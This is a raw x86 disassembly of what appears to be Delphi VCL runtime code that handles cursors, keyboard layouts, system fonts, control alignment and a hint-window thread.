movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_466d90
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_466dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420d38
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_467164
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_467170
mov eax ebx
call sub_46717c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_463598
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4675e4
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4674c0
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4674c0
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4674c0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_466f18
push ebx
push esi
push edi
push ebp
call sub_4034f4
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403128
mov eax [ ebp + 0x88 ]
call sub_403128
mov eax [ ebp + 0x84 ]
call sub_403128
mov eax [ ebp + 0x54 ]
call sub_403128
mov eax [ ebp + 0x50 ]
call sub_403128
mov eax [ ebp + 0x4c ]
call sub_403128
mov eax [ ebp + 0x30 ]
call sub_403128
mov eax [ ebp + 0x34 ]
call sub_403128
mov eax [ ebp + 0x7c ]
call sub_403128
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403128
mov eax ebp
call sub_4671d8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420d84
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034dc
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418700
call sub_403128
inc edi
dec esi
jne r-xdata
sub_467090
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4670dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185a4
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4185a4
mov eax [ rw-data ]
call sub_469f0c
sub_467114
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41889c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41889c
mov eax [ rw-data ]
call sub_469f0c
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_450d90
sub_46717c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46727c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4671d8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_467234
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_46703c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_467028
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_467028
cmp ebp [ eax + 0x4 ]
jne r-xdata
sub_46727c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4672a4
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46744f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467456
lea eax [ ebp - 0x260 ]
call sub_403eb8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403eb8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41ad38
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408ec8
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_454544
test al al
je r-xdata
xor eax eax
push ebp
push sub_46740b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404128
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404128
sub_4674c0
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_469d7c
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469b30
mov dl 0x1
mov eax [ rw-data ]
call sub_469b30
sub_46752c
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_467554
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46752c
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406b90
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406ae8
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4675e4
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_467729
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469b30
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424428
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424428
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_42450c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424428
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424428
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424428
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_469b30
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_42426c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_42426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467730
cmp [ rw-data ] 0x0
je r-xdata
sub_467768
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_4677c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_467904 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_467978
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_467088
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418700
mov dl [ ebp - 0x1 ]
call sub_4677c8
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_467074
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4185a4
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41877c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418700
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_467768
test al al
je r-xdata
inc esi
sub_467ac4
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_467088
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_467074
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_467b1c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_467ac4
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467b96
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_467978
pop ecx
push ebp
mov al 0x2
call sub_467978
pop ecx
push ebp
mov al 0x3
call sub_467978
pop ecx
push ebp
mov al 0x4
call sub_467978
pop ecx
push ebp
mov al 0x5
call sub_467978
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_467ba4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467738
xor eax eax
push ebp
push sub_467c1d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_467b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_467740
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_467c38
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403eb8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f0c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_467c90
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_467cc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46a138
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_467ce4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4477fc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46a1b4
sub_467d40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_469254
sub_467d84
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_467d40
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_467ce4
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_467df8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_467e54
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_467e84
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_467eac
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_467e54
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_467e84
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_467e84
sub_467edc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_467234
pop edi
pop esi
pop ebx
retn
sub_467f0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_467234
pop edi
pop esi
pop ebx
retn
sub_467f48
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420d38
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_469620
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
